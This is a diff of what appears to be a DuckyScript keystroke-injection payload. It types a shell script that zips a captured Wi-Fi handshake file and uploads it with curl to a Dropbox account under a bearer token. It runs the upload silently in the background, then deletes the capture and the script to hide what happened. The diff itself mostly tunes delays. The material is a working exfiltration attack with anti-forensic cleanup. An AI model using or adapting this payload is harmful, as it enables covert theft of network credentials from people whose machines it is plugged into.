@@ -48,18 +48,17 @@ ENTER
 DELAY 500 
 CTRL c
 DELAY 2000
-STRING  echo 'cd ~/Desktop && zip -r "CapturedHandshake.zip" captured.pcap && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer \<API ACCESS TOKEN>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/CapturedHandshake.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"CapturedHandshake.zip"' > upload.sh
+STRING  echo 'cd ~/Desktop && zip -r "CapturedHandshake.zip" captured.pcap && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API ACCESS TOKEN>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/CapturedHandshake.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @"CapturedHandshake.zip"' > upload.sh
 DELAY 500
 ENTER
-DELAY 2500
-ENTER
+DELAY 500
 STRING  chmod +x upload.sh
 ENTER
 DELAY 500
 STRING  nohup ./upload.sh >/dev/null 2>&1 &
 DELAY 500
 ENTER
-DELAY 4000
+DELAY 10000
 STRING  rm ~/Desktop/captured.pcap
 DELAY 500 
 ENTER
@@ -69,6 +68,9 @@ ENTER
 STRING  rm upload.sh
 DELAY 500
 ENTER
+DELAY 5000
 GUI w
+DELAY 500
+ENTER
 
 
